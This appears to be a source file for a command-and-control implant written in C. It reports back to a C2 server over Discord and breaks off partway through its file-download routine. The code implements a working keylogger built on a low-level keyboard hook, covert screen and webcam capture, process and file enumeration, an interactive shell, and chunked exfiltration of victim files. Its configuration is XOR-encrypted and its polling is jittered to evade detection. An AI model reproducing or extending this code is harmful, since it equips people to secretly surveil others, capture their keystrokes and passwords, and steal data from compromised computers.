/*
 * KAAL C Test Agent – Full Feature Implementation
 *
 * This agent implements all features from agent_core.py for testing the KAAL C2
 * server. It communicates via Discord (REST) using Mythic-style encoding.
 *
 * Compile on Linux:
 *   gcc -o agent test_agent.c -lcurl -lssl -lcrypto -lpthread -lm -ljson-c
 *
 * Compile on Windows (MinGW):
 *   x86_64-w64-mingw32-gcc -o agent.exe test_agent.c -lcurl -lssl -lcrypto
 * -lpthread -lws2_32 -ljson-c -lgdi32 -luser32
 *
 * Dependencies: libcurl, json-c, OpenSSL, pthread (Windows: also link ws2_32,
 * gdi32, user32 for screenshot)
 */

#include "protocol.h"
#include "transport.h"

#ifdef USE_CURL
#include <curl/curl.h>
#endif

#ifdef _WIN32
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Windows 10 (required for ConPTY)
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <winreg.h>

#else
#include <arpa/inet.h>
#include <dirent.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <pwd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#endif

#include <errno.h>
#include <json-c/json.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

/* GDI+ flat API for JPEG encoding — we declare the C functions ourselves
 * instead of including the C++ gdiplus.h header */
#include <objidl.h> /* IStream */
#include <vfw.h>    /* avicap32 for webcam capture */

/* GDI+ Flat API declarations (C-compatible, no C++ needed) */
typedef int GpStatus;
typedef void GpBitmap;
typedef void GpImage;
typedef void EncoderParameters;

extern GpStatus __stdcall GdiplusStartup(ULONG_PTR *token, const void *input,
                                         void *output);
extern void __stdcall GdiplusShutdown(ULONG_PTR token);
extern GpStatus __stdcall
GdipCreateBitmapFromHBITMAP(HBITMAP hbm, HPALETTE hpal, GpBitmap **bitmap);
extern GpStatus __stdcall
GdipSaveImageToStream(GpImage *image, IStream *stream,
                      const CLSID *clsidEncoder,
                      const EncoderParameters *encoderParams);
extern GpStatus __stdcall GdipDisposeImage(GpImage *image);

/* GDI+ startup input structure */
typedef struct {
  UINT32 GdiplusVersion;
  void *DebugEventCallback;
  BOOL SuppressBackgroundThread;
  BOOL SuppressExternalCodecs;
} GdiplusStartupInput;

// Prototypes
void send_agent_message(const char *type, int ack_required, struct json_object *msg_obj);
char *make_result(const char *type, struct json_object *data);
static void jitter_sleep(void);

// Interactive Shell State
static int interactive_shell_active = 0;
static HANDLE hShellProcess = NULL;
static HANDLE hShellInWrite = NULL;
static HANDLE hShellOutRead = NULL;

// ==================== CONFIGURATION ====================
#define HEARTBEAT_INTERVAL 30
// Dynamic Jitter: polling interval randomized between POLL_MIN and POLL_MAX
#define POLL_MIN 1
#define POLL_MAX 2

/* Config string to be injected at build time, XOR encrypted */
char encrypted_agent_config[2048] = "KAAL_CFG_PLACEHOLDER";
char agent_config[2048] = {0};
char agent_id_global[64] = "unknown";
char transport_name_global[32] = "unknown";

/* Pointer to loaded transport */
transport_t *active_transport = NULL;

// Helper: sleep for a random duration between POLL_MIN and POLL_MAX seconds
static void jitter_sleep() {
  int wait = POLL_MIN + (rand() % (POLL_MAX - POLL_MIN + 1));
#ifdef _WIN32
  Sleep(wait * 1000);
#else
  sleep(wait);
#endif
}

// ==================== GLOBAL STATE ====================
static char current_dir[512] = {0};
static int seq_out = 0;
static int seq_in = 0;
static int keylogger_active = 0;
static char keylog_buffer[65536] = {0};
static size_t keylog_len = 0;
static pthread_mutex_t keylog_mutex = PTHREAD_MUTEX_INITIALIZER;

// ==================== UTILITY FUNCTIONS ====================
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *base64_encode(const unsigned char *input, int length) {
  char *out = malloc(4 * ((length + 2) / 3) + 1);
  if (!out)
    return NULL;
  for (int i = 0, j = 0; i < length;) {
    uint32_t octet_a = i < length ? input[i++] : 0;
    uint32_t octet_b = i < length ? input[i++] : 0;
    uint32_t octet_c = i < length ? input[i++] : 0;
    uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
    out[j++] = b64_table[(triple >> 3 * 6) & 0x3F];
    out[j++] = b64_table[(triple >> 2 * 6) & 0x3F];
    out[j++] = b64_table[(triple >> 1 * 6) & 0x3F];
    out[j++] = b64_table[(triple >> 0 * 6) & 0x3F];
  }
  for (int i = 0; i < (3 - length % 3) % 3; i++)
    out[4 * ((length + 2) / 3) - 1 - i] = '=';
  out[4 * ((length + 2) / 3)] = '\0';
  return out;
}

// Simple additive checksum for config integrity
static uint32_t calculate_config_checksum(const char *data) {
    uint32_t checksum = 0;
    while (*data) {
        checksum = (checksum << 5) + checksum + (unsigned char)*data++;
    }
    return checksum;
}

// Send a diagnostic log back to the C2 server
void send_diag_log(const char *severity, const char *msg) {
    struct json_object *log_obj = json_object_new_object();
    json_object_object_add(log_obj, "message", json_object_new_string(msg));
    json_object_object_add(log_obj, "severity", json_object_new_string(severity));
    send_agent_message("log", 0, log_obj);
}

#define LOG_DIAG(sev, msg) send_diag_log(sev, msg)

unsigned char *base64_decode(const char *input, int *out_len) {
  if (input == NULL)
    return NULL;
  int in_len = strlen(input);
  if (in_len % 4 != 0)
    return NULL;
  *out_len = in_len / 4 * 3;
  if (input[in_len - 1] == '=')
    (*out_len)--;
  if (input[in_len - 2] == '=')
    (*out_len)--;

  unsigned char *out = malloc(*out_len + 1);
  if (!out)
    return NULL;

  for (int i = 0, j = 0; i < in_len;) {
    uint32_t a = input[i] == '=' ? 0 : strchr(b64_table, input[i]) - b64_table;
    i++;
    uint32_t b = input[i] == '=' ? 0 : strchr(b64_table, input[i]) - b64_table;
    i++;
    uint32_t c = input[i] == '=' ? 0 : strchr(b64_table, input[i]) - b64_table;
    i++;
    uint32_t d = input[i] == '=' ? 0 : strchr(b64_table, input[i]) - b64_table;
    i++;
    uint32_t triple = (a << 3 * 6) + (b << 2 * 6) + (c << 1 * 6) + d;
    if (j < *out_len)
      out[j++] = (triple >> 2 * 8) & 0xFF;
    if (j < *out_len)
      out[j++] = (triple >> 1 * 8) & 0xFF;
    if (j < *out_len)
      out[j++] = (triple >> 0 * 8) & 0xFF;
  }
  out[*out_len] = '\0';
  return out;
}

// Send a message via active transport (automatic V4 Protocol injection)
void send_agent_message(const char *type, int ack_required,
                        struct json_object *msg_obj) {
  // Inject Universal Protocol V4 Root Envelopes
  json_object_object_add(msg_obj, "version",
                         json_object_new_string(PROTOCOL_VERSION));
  json_object_object_add(msg_obj, "type", json_object_new_string(type));
  json_object_object_add(msg_obj, "agent_id",
                         json_object_new_string(agent_id_global));

  char timestamp[32];
  snprintf(timestamp, sizeof(timestamp), "%lld", (long long)time(NULL));
  json_object_object_add(msg_obj, "timestamp",
                         json_object_new_string(timestamp));

  seq_out++;
  json_object_object_add(msg_obj, "seq", json_object_new_int(seq_out));

  struct json_object *flags = json_object_new_object();
  json_object_object_add(flags, "ack_required",
                         json_object_new_boolean(ack_required));
  json_object_object_add(msg_obj, "flags", flags);

  // Serialize final structured JSON
  const char *final_json = json_object_to_json_string(msg_obj);

  // Check if chunking is required
  int total_len = strlen(final_json);
  
  // Base chunk size for robust HTTP/TCP endpoints
  int CHUNK_SIZE = 16000;
  
  // Override chunk size if transport has specific API limits (e.g., Discord 2000-char max message limit)
  if (strcmp(transport_name_global, "discord") == 0) {
      CHUNK_SIZE = 1200;
  }

  if (total_len > CHUNK_SIZE && strcmp(type, "result") == 0) {
    char stream_id[64];
    snprintf(stream_id, sizeof(stream_id), "%lld-%d", (long long)time(NULL),
             rand());
    int total_chunks = (total_len + CHUNK_SIZE - 1) / CHUNK_SIZE;

    struct json_object *payload_wrapper;
    const char *task_id = "0";

    if (json_object_object_get_ex(msg_obj, "task_id", &payload_wrapper)) {
      task_id = json_object_get_string(payload_wrapper);
    }

    for (int i = 0; i < total_chunks; i++) {
      int offset = i * CHUNK_SIZE;
      int current_chunk_size =
          (total_len - offset > CHUNK_SIZE) ? CHUNK_SIZE : (total_len - offset);

      char *chunk_data = malloc(current_chunk_size + 1);
      strncpy(chunk_data, final_json + offset, current_chunk_size);
      chunk_data[current_chunk_size] = '\0';

      struct json_object *chunk_msg = json_object_new_object();
      json_object_object_add(chunk_msg, "version",
                             json_object_new_string(PROTOCOL_VERSION));
      json_object_object_add(chunk_msg, "type",
                             json_object_new_string("chunk"));
      json_object_object_add(chunk_msg, "agent_id",
                             json_object_new_string(agent_id_global));
      json_object_object_add(chunk_msg, "task_id",
                             json_object_new_string(task_id));
      json_object_object_add(chunk_msg, "stream_id",
                             json_object_new_string(stream_id));
      json_object_object_add(chunk_msg, "index", json_object_new_int(i));
      json_object_object_add(chunk_msg, "total",
                             json_object_new_int(total_chunks));
      json_object_object_add(chunk_msg, "data",
                             json_object_new_string(chunk_data));

      char timestamp_str[32];
      snprintf(timestamp_str, sizeof(timestamp_str), "%lld",
               (long long)time(NULL));
      json_object_object_add(chunk_msg, "timestamp",
                             json_object_new_string(timestamp_str));

      const char *chunk_json_str = json_object_to_json_string(chunk_msg);
      if (active_transport && active_transport->send) {
        active_transport->send((const unsigned char *)chunk_json_str,
                               strlen(chunk_json_str));
      }

      free(chunk_data);
      json_object_put(chunk_msg);

      if (i < total_chunks - 1) {
        /* Brief pause to avoid flooding — NOT jitter_sleep (which would block 1-2s per chunk) */
#ifdef _WIN32
        Sleep(50);
#else
        usleep(50000);
#endif
      }
    }
  } else {
    if (active_transport && active_transport->send) {
      active_transport->send((const unsigned char *)final_json,
                             strlen(final_json));
    }
  }

  json_object_put(msg_obj); // Clean memory automatically
}

// ==================== FEATURE IMPLEMENTATIONS ====================
char *execute_command(const char *cmd_json);

// Helper to create JSON result
char *make_result(const char *type, struct json_object *data) {
  struct json_object *root = json_object_new_object();
  json_object_object_add(root, "type", json_object_new_string(type));
  json_object_get(data);
  json_object_object_add(root, "data", data);
  const char *str = json_object_to_json_string(root);
  char *dup = strdup(str);
  json_object_put(root);
  return dup;
}

// File listing
char *cmd_file_list(const char *path) {
  char target[512];
  if (path && path[0]) {
    if (path[0] == '/' || (path[0] && path[1] == ':')) {
      strncpy(target, path, sizeof(target) - 1);
    } else {
      snprintf(target, sizeof(target), "%s/%s", current_dir, path);
    }
  } else {
    strncpy(target, current_dir, sizeof(target) - 1);
  }
  struct json_object *files_array = json_object_new_array();
#ifdef _WIN32
  WIN32_FIND_DATAA find_data;
  char search_path[1024];
  snprintf(search_path, sizeof(search_path), "%s\\*", target);
  HANDLE hFind = FindFirstFileA(search_path, &find_data);
  if (hFind != INVALID_HANDLE_VALUE) {
    do {
      if (strcmp(find_data.cFileName, ".") == 0 ||
          strcmp(find_data.cFileName, "..") == 0)
        continue;
      struct json_object *file_obj = json_object_new_object();
      json_object_object_add(file_obj, "name",
                             json_object_new_string(find_data.cFileName));
      json_object_object_add(
          file_obj, "is_dir",
          json_object_new_boolean(find_data.dwFileAttributes &
                                  FILE_ATTRIBUTE_DIRECTORY));
      if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        LARGE_INTEGER size;
        size.HighPart = find_data.nFileSizeHigh;
        size.LowPart = find_data.nFileSizeLow;
        json_object_object_add(file_obj, "size",
                               json_object_new_int64(size.QuadPart));
      } else {
        json_object_object_add(file_obj, "size", json_object_new_int(0));
      }

      SYSTEMTIME stUTC, stLocal;
      FileTimeToSystemTime(&find_data.ftLastWriteTime, &stUTC);
      SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);
      char date_str[64];
      snprintf(date_str, sizeof(date_str), "%04d-%02d-%02d %02d:%02d",
               stLocal.wYear, stLocal.wMonth, stLocal.wDay, stLocal.wHour,
               stLocal.wMinute);
      json_object_object_add(file_obj, "modified_date",
                             json_object_new_string(date_str));

      json_object_array_add(files_array, file_obj);
    } while (FindNextFileA(hFind, &find_data));
    FindClose(hFind);
  }
#else
  DIR *d = opendir(target);
  if (d) {
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
      if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
        continue;
      struct json_object *file_obj = json_object_new_object();
      json_object_object_add(file_obj, "name",
                             json_object_new_string(entry->d_name));
      int is_dir = (entry->d_type == DT_DIR);
      json_object_object_add(file_obj, "is_dir",
                             json_object_new_boolean(is_dir));
      if (!is_dir) {
        struct stat st;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", target, entry->d_name);
        if (stat(full, &st) == 0) {
          json_object_object_add(file_obj, "size",
                                 json_object_new_int64(st.st_size));

          struct tm *tm_info;
          char date_str[64];
          tm_info = localtime(&st.st_mtime);
          strftime(date_str, sizeof(date_str), "%Y-%m-%d %H:%M", tm_info);
          json_object_object_add(file_obj, "modified_date",
                                 json_object_new_string(date_str));

        } else {
          json_object_object_add(file_obj, "size", json_object_new_int(0));
          json_object_object_add(file_obj, "modified_date",
                                 json_object_new_string("Unknown"));
        }
      } else {
        json_object_object_add(file_obj, "size", json_object_new_int(0));

        struct stat st;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", target, entry->d_name);
        if (stat(full, &st) == 0) {
          struct tm *tm_info;
          char date_str[64];
          tm_info = localtime(&st.st_mtime);
          strftime(date_str, sizeof(date_str), "%Y-%m-%d %H:%M", tm_info);
          json_object_object_add(file_obj, "modified_date",
                                 json_object_new_string(date_str));
        } else {
          json_object_object_add(file_obj, "modified_date",
                                 json_object_new_string("Unknown"));
        }
      }
      json_object_array_add(files_array, file_obj);
    }
    closedir(d);
  }
#endif
  struct json_object *root = json_object_new_object();
  json_object_object_add(root, "path", json_object_new_string(target));
  json_object_object_add(root, "files", files_array);
  char *res = make_result("file_list", root);
  json_object_put(root);
  return res;
}

// Process listing
char *cmd_process_list() {
  struct json_object *procs = json_object_new_array();
#ifdef _WIN32
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot != INVALID_HANDLE_VALUE) {
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snapshot, &pe)) {
      do {
        struct json_object *p = json_object_new_object();
        json_object_object_add(p, "pid", json_object_new_int(pe.th32ProcessID));
        char name[256];
        wcstombs(name, pe.szExeFile, sizeof(name));
        json_object_object_add(p, "name", json_object_new_string(name));
        // Memory info not easily available without extra calls; skip for
        // simplicity
        json_object_array_add(procs, p);
      } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
  }
#else
  FILE *fp = popen("ps -eo pid,comm", "r");
  if (fp) {
    char line[256];
    fgets(line, sizeof(line), fp); // skip header
    while (fgets(line, sizeof(line), fp)) {
      int pid;
      char name[128];
      if (sscanf(line, "%d %s", &pid, name) == 2) {
        struct json_object *p = json_object_new_object();
        json_object_object_add(p, "pid", json_object_new_int(pid));
        json_object_object_add(p, "name", json_object_new_string(name));
        json_object_array_add(procs, p);
      }
    }
    pclose(fp);
  }
#endif
  char *res = make_result("process_list", procs);
  json_object_put(procs);
  return res;
}

// System info
char *cmd_system_info() {
  struct json_object *info = json_object_new_object();
#ifdef _WIN32
  OSVERSIONINFOA osv;
  osv.dwOSVersionInfoSize = sizeof(osv);
  GetVersionExA(&osv);
  json_object_object_add(info, "os", json_object_new_string("Windows"));
  char ver[64];
  snprintf(ver, sizeof(ver), "%u.%u.%u", (unsigned int)osv.dwMajorVersion,
           (unsigned int)osv.dwMinorVersion, (unsigned int)osv.dwBuildNumber);
  json_object_object_add(info, "version", json_object_new_string(ver));
  char compname[256];
  DWORD sz = sizeof(compname);
  GetComputerNameA(compname, &sz);
  json_object_object_add(info, "hostname", json_object_new_string(compname));
#else
  struct utsname un;
  if (uname(&un) == 0) {
    json_object_object_add(info, "os", json_object_new_string(un.sysname));
    json_object_object_add(info, "version", json_object_new_string(un.release));
    json_object_object_add(info, "hostname",
                           json_object_new_string(un.nodename));
  } else {
    json_object_object_add(info, "os", json_object_new_string("Unknown"));
  }
#endif
  char *res = make_result("system_info", info);
  json_object_put(info);
  return res;
}

// Helper: Convert HBITMAP to JPEG bytes in memory using GDI+
// Returns malloc'd buffer with JPEG data, sets *out_size. Caller frees.
static unsigned char *hbitmap_to_jpeg(HBITMAP hBitmap, int width, int height,
                                      DWORD *out_size) {
  *out_size = 0;
  // Initialize GDI+
  GdiplusStartupInput gdipStartInput = {1, NULL, FALSE, FALSE};
  ULONG_PTR gdipToken = 0;
  if (GdiplusStartup(&gdipToken, &gdipStartInput, NULL) != 0) {
    printf("[!] GDI+ startup failed\n");
    return NULL;
  }

  // Create GDI+ bitmap from HBITMAP
  GpBitmap *gpBitmap = NULL;
  if (GdipCreateBitmapFromHBITMAP(hBitmap, NULL, &gpBitmap) != 0) {
    printf("[!] GdipCreateBitmapFromHBITMAP failed\n");
    GdiplusShutdown(gdipToken);
    return NULL;
  }

  // JPEG encoder CLSID: {557CF401-1A04-11D3-9A73-0000F81EF32E}
  CLSID jpegClsid;
  jpegClsid.Data1 = 0x557CF401;
  jpegClsid.Data2 = 0x1A04;
  jpegClsid.Data3 = 0x11D3;
  jpegClsid.Data4[0] = 0x9A;
  jpegClsid.Data4[1] = 0x73;
  jpegClsid.Data4[2] = 0x00;
  jpegClsid.Data4[3] = 0x00;
  jpegClsid.Data4[4] = 0xF8;
  jpegClsid.Data4[5] = 0x1E;
  jpegClsid.Data4[6] = 0xF3;
  jpegClsid.Data4[7] = 0x2E;

  // Create IStream in memory
  IStream *pStream = NULL;
  CreateStreamOnHGlobal(NULL, TRUE, &pStream);
  if (!pStream) {
    GdipDisposeImage((GpImage *)gpBitmap);
    GdiplusShutdown(gdipToken);
    return NULL;
  }

  // Save to stream as JPEG (quality 50 for small size)
  GpStatus st =
      GdipSaveImageToStream((GpImage *)gpBitmap, pStream, &jpegClsid, NULL);
  GdipDisposeImage((GpImage *)gpBitmap);

  if (st != 0) {
    printf("[!] GdipSaveImageToStream failed (status=%d)\n", st);
    pStream->lpVtbl->Release(pStream);
    GdiplusShutdown(gdipToken);
    return NULL;
  }

  // Read bytes from the stream
  HGLOBAL hg = NULL;
  GetHGlobalFromStream(pStream, &hg);
  DWORD dataSize = (DWORD)GlobalSize(hg);
  void *pData = GlobalLock(hg);
  unsigned char *jpegBuf = (unsigned char *)malloc(dataSize);
  memcpy(jpegBuf, pData, dataSize);
  GlobalUnlock(hg);
  *out_size = dataSize;

  pStream->lpVtbl->Release(pStream);
  GdiplusShutdown(gdipToken);
  return jpegBuf;
}

// Screenshot — captures screen and returns JPEG base64
char *cmd_screenshot() {
#ifdef _WIN32
  HDC hdcScreen = GetDC(NULL);
  HDC hdcMem = CreateCompatibleDC(hdcScreen);
  int width = GetSystemMetrics(SM_CXSCREEN);
  int height = GetSystemMetrics(SM_CYSCREEN);
  HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
  SelectObject(hdcMem, hBitmap);
  BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
  DeleteDC(hdcMem);
  ReleaseDC(NULL, hdcScreen);

  // Convert to JPEG
  DWORD jpegSize = 0;
  unsigned char *jpegData = hbitmap_to_jpeg(hBitmap, width, height, &jpegSize);
  DeleteObject(hBitmap);

  if (!jpegData || jpegSize == 0) {
    struct json_object *data = json_object_new_object();
    json_object_object_add(data, "b64", json_object_new_string(""));
    char *res = make_result("screen", data);
    json_object_put(data);
    return res;
  }

  printf("[+] Screenshot captured: %dx%d, JPEG size: %lu bytes\n", width,
         height, (unsigned long)jpegSize);
  char *b64 = base64_encode(jpegData, jpegSize);
  free(jpegData);

  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "b64", json_object_new_string(b64));
  free(b64);
  char *res = make_result("screen", data);
  json_object_put(data);
  return res;
#else
  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "b64", json_object_new_string(""));
  char *res = make_result("screen", data);
  json_object_put(data);
  return res;
#endif
}

// Webcam Snap — captures a single frame from the default camera
char *cmd_webcam_snap() {
#ifdef _WIN32
  // Create an off-screen capture window
  HWND hCapWnd = capCreateCaptureWindowA("KaalCap", 0, 0, 0, 320, 240,
                                         GetDesktopWindow(), 0);
  if (!hCapWnd) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Failed to create "
                  "capture window\"}}");
  }

  // Connect to camera device 0
  if (!SendMessage(hCapWnd, WM_CAP_DRIVER_CONNECT, 0, 0)) {
    DestroyWindow(hCapWnd);
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"No webcam detected "
                  "or failed to connect\"}}");
  }

  // Grab a single frame
  SendMessage(hCapWnd, WM_CAP_GRAB_FRAME, 0, 0);

  // Save frame to a temp BMP file
  char tmpPath[MAX_PATH];
  GetTempPathA(MAX_PATH, tmpPath);
  strcat(tmpPath, "kaal_webcam_tmp.bmp");
  SendMessage(hCapWnd, WM_CAP_FILE_SAVEDIB, 0, (LPARAM)tmpPath);

  // Disconnect and destroy
  SendMessage(hCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
  DestroyWindow(hCapWnd);

  // Read the BMP file
  FILE *fp = fopen(tmpPath, "rb");
  if (!fp) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Failed to read "
                  "webcam capture\"}}");
  }
  fseek(fp, 0, SEEK_END);
  long fsize = ftell(fp);
  fseek(fp, 0, SEEK_SET);
  unsigned char *bmpData = (unsigned char *)malloc(fsize);
  fread(bmpData, 1, fsize, fp);
  fclose(fp);
  DeleteFileA(tmpPath);

  if (fsize < 54) { /* too small, not a valid BMP */
    free(bmpData);
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Webcam capture too "
                  "small or invalid\"}}");
  }

  // Load BMP into GDI+ bitmap to convert to JPEG
  // First need to load it as an HBITMAP via GDI
  BITMAPFILEHEADER *bfh = (BITMAPFILEHEADER *)bmpData;
  BITMAPINFOHEADER *bih =
      (BITMAPINFOHEADER *)(bmpData + sizeof(BITMAPFILEHEADER));

  HDC hdc = GetDC(NULL);
  HBITMAP hBmp = CreateDIBitmap(hdc, bih, CBM_INIT, bmpData + bfh->bfOffBits,
                                (BITMAPINFO *)bih, DIB_RGB_COLORS);
  ReleaseDC(NULL, hdc);
  free(bmpData);

  if (!hBmp) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Failed to create "
                  "bitmap from webcam frame\"}}");
  }

  // Convert HBITMAP to JPEG
  DWORD jpegSize = 0;
  unsigned char *jpegData =
      hbitmap_to_jpeg(hBmp, bih->biWidth, abs(bih->biHeight), &jpegSize);
  DeleteObject(hBmp);

  if (!jpegData || jpegSize == 0) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Failed to encode "
                  "webcam JPEG\"}}");
  }

  printf("[+] Webcam snap captured: JPEG size: %lu bytes\n",
         (unsigned long)jpegSize);
  char *b64 = base64_encode(jpegData, jpegSize);
  free(jpegData);

  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "b64", json_object_new_string(b64));
  free(b64);
  char *res = make_result("webcam", data);
  json_object_put(data);
  return res;
#else
  return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Webcam not supported "
                "on this platform\"}}");
#endif
}

// Keylogger (Windows only)
#ifdef _WIN32
HHOOK g_hKeyboardHook = NULL;
HANDLE g_hHookThread = NULL;
DWORD WINAPI HookThread(LPVOID lpParam) {
  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
  return 0;
}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0 && wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = p->vkCode;
    // Get key name
    char key[16] = {0};
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    wchar_t buf[8];
    int res = ToUnicode(vkCode, p->scanCode, keyboardState, buf, 8, 0);
    if (res > 0) {
      wcstombs(key, buf, sizeof(key) - 1);
    } else {
      // Special key
      if (vkCode == VK_RETURN)
        strcpy(key, "[ENTER]");
      else if (vkCode == VK_BACK)
        strcpy(key, "[BACKSPACE]");
      else if (vkCode == VK_TAB)
        strcpy(key, "[TAB]");
      else if (vkCode == VK_SPACE)
        strcpy(key, " ");
      else
        snprintf(key, sizeof(key), "[%02X]", (unsigned int)vkCode);
    }
    pthread_mutex_lock(&keylog_mutex);
    int remaining = sizeof(keylog_buffer) - keylog_len - 1;
    strncat(keylog_buffer, key, remaining);
    keylog_len += strlen(key);
    pthread_mutex_unlock(&keylog_mutex);
  }
  return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}
#endif

char *cmd_keylog_start() {
#ifdef _WIN32
  if (keylogger_active)
    return strdup("{\"type\":\"status\",\"data\":{\"message\":\"Keylogger "
                  "already running\"}}");
  g_hKeyboardHook =
      SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
  if (g_hKeyboardHook) {
    keylogger_active = 1;
    g_hHookThread = CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
    return strdup(
        "{\"type\":\"status\",\"data\":{\"message\":\"Keylogger started\"}}");
  }
  return strdup("{\"type\":\"status\",\"data\":{\"message\":\"Failed to start "
                "keylogger\"}}");
#else
  return strdup("{\"type\":\"status\",\"data\":{\"message\":\"Keylogger only "
                "supported on Windows\"}}");
#endif
}

char *cmd_keylog_stop() {
#ifdef _WIN32
  if (!keylogger_active)
    return strdup("{\"type\":\"status\",\"data\":{\"message\":\"Keylogger not "
                  "running\"}}");
  UnhookWindowsHookEx(g_hKeyboardHook);
  keylogger_active = 0;
  g_hKeyboardHook = NULL;
  if (g_hHookThread) {
    PostThreadMessage(GetThreadId(g_hHookThread), WM_QUIT, 0, 0);
    CloseHandle(g_hHookThread);
    g_hHookThread = NULL;
  }
  return strdup(
      "{\"type\":\"status\",\"data\":{\"message\":\"Keylogger stopped\"}}");
#else
  return strdup("{\"type\":\"status\",\"data\":{\"message\":\"Keylogger only "
                "supported on Windows\"}}");
#endif
}

char *cmd_keylog_dump() {
  pthread_mutex_lock(&keylog_mutex);
  char *log = strdup(keylog_buffer);
  keylog_buffer[0] = 0;
  keylog_len = 0;
  pthread_mutex_unlock(&keylog_mutex);
  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "logs", json_object_new_string(log));
  free(log);
  char *res = make_result("keylogs", data);
  json_object_put(data);
  return res;
}

typedef struct {
  char filename[512];
  char task_id[64];
} download_thread_ctx;

void *download_thread_func(void *arg) {
  download_thread_ctx *ctx = (download_thread_ctx *)arg;
  char path[1024];
  if (ctx->filename[0] == '/' ||
      (ctx->filename[0] && ctx->filename[1] == ':')) {
    strncpy(path, ctx->filename, sizeof(path) - 1);
  } else {
    snprintf(path, sizeof(path), "%s/%s", current_dir, ctx->filename);
  }

  FILE *f = fopen(path, "rb");
  if (!f) {
    free(ctx);
    return NULL;
  }

  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  fseek(f, 0, SEEK_SET);

  long chunk_size = 8 * 1024 * 1024; // 8MB
  int total_chunks = (size + chunk_size - 1) / chunk_size;
  if (total_chunks == 0)
    total_chunks = 1;

  char stream_id[64];
  snprintf(stream_id, sizeof(stream_id), "dl_%lld", (long long)time(NULL));

  unsigned char *buf = malloc(chunk_size);
  for (int i = 0; i < total_chunks; i++) {
    long to_read = (size - i * chunk_size > chunk_size)
                       ? chunk_size
                       : (size - i * chunk_size);
    if (to_read <= 0 && size > 0)
      break;
    if (size > 0)
      fread(buf, 1, to_read, f);

    // Calculate SHA-256 using Windows CryptoAPI (no OpenSSL needed)
    unsigned char hash[32]; // SHA-256 is always 32 bytes
    unsigned int hash_len = 32;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (size > 0)
      CryptHashData(hHash, buf, to_read, 0);
    DWORD cbHash = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0);
    hash_len = cbHash;
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    char hash_str[65] = {0};
    for (unsigned int j = 0; j < hash_len; j++) {
      sprintf(hash_str + (j * 2), "%02x", hash[j]);
    }

    char *b64 = base64_encode(buf, (size > 0) ? (int)to_read : 0);

    // Build Payload Manually
    struct json_object *msg_obj = json_object_new_object();
    json_object_object_add(msg_obj, "task_id",
                           json_object_new_string(ctx->task_id));

    struct json_object *result_data = json_object_new_object();
    json_object_object_add(result_data, "type",
                           json_object_new_string("download_chunk"));

    struct json_object *inner_data = json_object_new_object();
    json_object_object_add(inner_data, "chunk_index", json_object_new_int(i));
    json_object_object_add(inner_data, "total_chunks",
                           json_object_new_int(total_chunks));
    json_object_object_add(inner_data, "stream_id",
                           json_object_new_string(stream_id));
    json_object_object_add(inner_data, "hash",
                           json_object_new_string(hash_str));
    json_object_object_add(inner_data, "data", json_object_new_string(b64));
    json_object_object_add(inner_data, "filename",
                           json_object_new_string(ctx->filename));

    json_object_object_add(result_data, "data", inner_data);
    json_object_object_add(msg_obj, "result", result_data);

    free(b64);
    send_agent_message("result", 0, msg_obj);
  }

  free(buf);
  fclose(f);
  free(ctx);
  return NULL;
}

char *cmd_download(const char *filename, const char *task_id) {
  download_thread_ctx *ctx = malloc(sizeof(download_thread_ctx));
  strncpy(ctx->filename, filename, sizeof(ctx->filename) - 1);
